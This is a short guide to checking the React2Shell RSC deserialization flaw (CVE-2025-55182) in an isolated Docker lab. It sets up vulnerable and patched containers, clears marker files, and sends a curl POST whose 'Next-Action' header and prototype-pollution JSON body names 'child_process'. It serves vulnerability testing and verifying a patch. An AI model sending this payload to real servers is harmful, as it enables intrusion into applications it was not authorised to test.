# Proof of Concept (PoC) & Vulnerability Validation Guide
**Target Vulnerability:** React2Shell / RSC Deserialization (CVE-2025-55182)  
**Environment:** Container Isolated Docker Lab (`vulnerable-app` vs `patched-app`)

### Lab Configuration
- **Network Scope:** Localhost loopback (`127.0.0.1`) only; isolated bridge network.
- **Vulnerable Target:** `http://127.0.0.1:3001` (`container: react2shell-vulnerable`)
- **Patched Target:** `http://127.0.0.1:3002` (`container: react2shell-patched`)
- **Secrets Management:** Dummy environment variables (`DUMMY_SECRET`) applied inside containers.

Before running validation tests, purge all lingering artifact files from both containers to prevent false positives/negatives during assessment.

### Environment Cleanup
```bash
# 1. Remove existing marker artifacts from both containers
docker exec react2shell-vulnerable rm -f /app/public/exposed_secret.txt
docker exec react2shell-patched rm -f /app/public/exposed_secret.txt

# 2. Verify baseline state (Both endpoints MUST return HTTP 404)
curl.exe -i http://127.0.0.1:3001/exposed_secret.txt
curl.exe -i http://127.0.0.1:3002/exposed_secret.txt
```

### Test the vulnerable lab
```bash
curl.exe -i -X POST http://127.0.0.1:3001/ `
  -H "Next-Action: x" `
  -H "Content-Type: text/plain;charset=UTF-8" `
  --data-raw '{"__proto__":{"polluted":true},"id":"child_process"}'
```

### Test the patched lab
```bash
curl.exe -i -X POST http://127.0.0.1:3002/ `
  -H "Next-Action: x" `
  -H "Content-Type: text/plain;charset=UTF-8" `
  --data-raw '{"__proto__":{"polluted":true},"id":"child_process"}'
```


